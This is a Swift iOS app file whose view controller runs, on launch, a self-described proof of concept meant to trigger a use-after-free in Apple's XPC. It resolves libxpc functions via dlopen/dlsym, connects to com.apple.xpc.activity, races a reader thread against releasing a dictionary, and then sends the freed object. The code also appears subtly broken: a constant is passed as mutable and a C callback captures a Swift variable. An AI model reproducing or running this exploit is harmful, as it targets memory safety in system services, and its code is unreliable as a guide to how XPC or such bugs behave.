// ViewController.swift
import UIKit
import Foundation

// Objective-C wrapper for C PoC code
@objc class XPCPoC: NSObject {
    // C structs
    typealias xpc_object_t = UnsafeMutableRawPointer?

    struct OS_xpc_object {
        var superclass_opaque: (UInt8, UInt8, UInt8, UInt8, UInt8, UInt8, UInt8, UInt8)
    }

    struct OS_xpc_connection {
        var super: OS_xpc_object
    }

    struct OS_xpc_dictionary {
        var super: OS_xpc_object
    }

    struct OS_xpc_string {
        var super: OS_xpc_object
    }

    // Function pointer types
    typealias xpc_connection_create_mach_service_t = @convention(c) (UnsafePointer<CChar>, UnsafeMutableRawPointer?, UInt64) -> xpc_object_t
    typealias xpc_connection_set_event_handler_t = @convention(c) (xpc_object_t, @escaping (xpc_object_t) -> Void) -> Void
    typealias xpc_connection_resume_t = @convention(c) (xpc_object_t) -> Void
    typealias xpc_dictionary_create_t = @convention(c) (UnsafePointer<UnsafePointer<CChar>>?, UnsafePointer<xpc_object_t>?, Int) -> xpc_object_t
    typealias xpc_dictionary_set_value_t = @convention(c) (xpc_object_t, UnsafePointer<CChar>, xpc_object_t) -> Void
    typealias xpc_dictionary_get_value_t = @convention(c) (xpc_object_t, UnsafePointer<CChar>) -> xpc_object_t
    typealias xpc_string_create_t = @convention(c) (UnsafePointer<CChar>) -> xpc_object_t
    typealias xpc_release_t = @convention(c) (xpc_object_t) -> Void
    typealias xpc_connection_send_message_t = @convention(c) (xpc_object_t, xpc_object_t) -> Void

    // Function pointers
    static var xpc_connection_create_mach_service_ptr: xpc_connection_create_mach_service_t?
    static var xpc_connection_set_event_handler_ptr: xpc_connection_set_event_handler_t?
    static var xpc_connection_resume_ptr: xpc_connection_resume_t?
    static var xpc_dictionary_create_ptr: xpc_dictionary_create_t?
    static var xpc_dictionary_set_value_ptr: xpc_dictionary_set_value_t?
    static var xpc_dictionary_get_value_ptr: xpc_dictionary_get_value_t?
    static var xpc_string_create_ptr: xpc_string_create_t?
    static var xpc_release_ptr: xpc_release_t?
    static var xpc_connection_send_message_ptr: xpc_connection_send_message_t?

    // Initialize function pointers
    @objc static func initXPCFunctions() {
        guard let libxpc = dlopen("/usr/lib/libxpc.dylib", RTLD_LAZY) else {
            print("Failed to load libxpc.dylib: \(String(cString: dlerror() ?? "Unknown error"))")
            return
        }

        xpc_connection_create_mach_service_ptr = unsafeBitCast(dlsym(libxpc, "xpc_connection_create_mach_service"), to: xpc_connection_create_mach_service_t?.self)
        xpc_connection_set_event_handler_ptr = unsafeBitCast(dlsym(libxpc, "xpc_connection_set_event_handler"), to: xpc_connection_set_event_handler_t?.self)
        xpc_connection_resume_ptr = unsafeBitCast(dlsym(libxpc, "xpc_connection_resume"), to: xpc_connection_resume_t?.self)
        xpc_dictionary_create_ptr = unsafeBitCast(dlsym(libxpc, "xpc_dictionary_create"), to: xpc_dictionary_create_t?.self)
        xpc_dictionary_set_value_ptr = unsafeBitCast(dlsym(libxpc, "xpc_dictionary_set_value"), to: xpc_dictionary_set_value_t?.self)
        xpc_dictionary_get_value_ptr = unsafeBitCast(dlsym(libxpc, "xpc_dictionary_get_value"), to: xpc_dictionary_get_value_t?.self)
        xpc_string_create_ptr = unsafeBitCast(dlsym(libxpc, "xpc_string_create"), to: xpc_string_create_t?.self)
        xpc_release_ptr = unsafeBitCast(dlsym(libxpc, "xpc_release"), to: xpc_release_t?.self)
        xpc_connection_send_message_ptr = unsafeBitCast(dlsym(libxpc, "xpc_connection_send_message"), to: xpc_connection_send_message_t?.self)

        if xpc_connection_create_mach_service_ptr == nil || xpc_connection_set_event_handler_ptr == nil ||
           xpc_connection_resume_ptr == nil || xpc_dictionary_create_ptr == nil ||
           xpc_dictionary_set_value_ptr == nil || xpc_dictionary_get_value_ptr == nil ||
           xpc_string_create_ptr == nil || xpc_release_ptr == nil || xpc_connection_send_message_ptr == nil {
            print("Failed to resolve some XPC functions")
        }
    }

    // PoC to trigger UAF
    @objc static func runXPCPoC() -> String {
        var result = "PoC Executed"

        initXPCFunctions()
        guard let createConn = xpc_connection_create_mach_service_ptr else {
            return "Failed to initialize XPC functions"
        }

        guard let conn = createConn("com.apple.xpc.activity", nil, 0) else {
            return "Failed to create connection"
        }

        xpc_connection_set_event_handler_ptr?(conn) { event in
            _ = xpc_dictionary_get_value_ptr?(event, "key")
        }
        xpc_connection_resume_ptr?(conn)

        guard let dict = xpc_dictionary_create_ptr?(nil, nil, 0) else {
            xpc_release_ptr?(conn)
            return "Failed to create dictionary"
        }

        let value = xpc_string_create_ptr?("test")
        xpc_dictionary_set_value_ptr?(dict, "key", value)
        xpc_release_ptr?(value)

        var thread: pthread_t?
        let threadResult = withUnsafeMutablePointer(to: &dict) { dictPtr in
            pthread_create(&thread, nil, { arg in
                guard let d = arg?.assumingMemoryBound(to: xpc_object_t.self).pointee else { return nil }
                let val = xpc_dictionary_get_value_ptr?(d, "key")
                result = String(format: "Thread accessed value: %p", val ?? UnsafeMutableRawPointer(bitPattern: 0)!)
                return nil
            }, dictPtr)
        }

        if threadResult != 0 {
            xpc_release_ptr?(dict)
            xpc_release_ptr?(conn)
            return "Failed to create thread"
        }

        xpc_release_ptr?(dict)
        xpc_connection_send_message_ptr?(conn, dict)

        if let thread = thread {
            var threadReturn: UnsafeMutableRawPointer?
            pthread_join(thread, &threadReturn)
        }
        xpc_release_ptr?(conn)
        return result
    }
}

class ViewController: UIViewController {
    private let logView: UITextView = {
        let textView = UITextView()
        textView.translatesAutoresizingMaskIntoConstraints = false
        textView.isEditable = false
        return textView
    }()

    private let resultLabel: UILabel = {
        let label = UILabel()
        label.translatesAutoresizingMaskIntoConstraints = false
        label.textAlignment = .center
        label.numberOfLines = 0
        label.text = "Running XPC PoC..."
        return label
    }()

    override func viewDidLoad() {
        super.viewDidLoad()
        view.addSubview(logView)
        NSLayoutConstraint.activate([
            logView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor, constant: 20),
            logView.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 20),
            logView.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -20),
            logView.heightAnchor.constraint(equalTo: view.heightAnchor, multiplier: 0.5)
        ])
        view.addSubview(resultLabel)
        NSLayoutConstraint.activate([
            resultLabel.topAnchor.constraint(equalTo: logView.bottomAnchor, constant: 20),
            resultLabel.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            resultLabel.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 20),
            resultLabel.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -20)
        ])

        DispatchQueue.global(qos: .userInitiated).async {
            let result = XPCPoC.runXPCPoC()
            DispatchQueue.main.async {
                self.logView.text = "PoC Log:\n\(result)"
                self.resultLabel.text = result.contains("Failed") ? "PoC Failed" : "PoC Succeeded"
            }
        }
    }
}
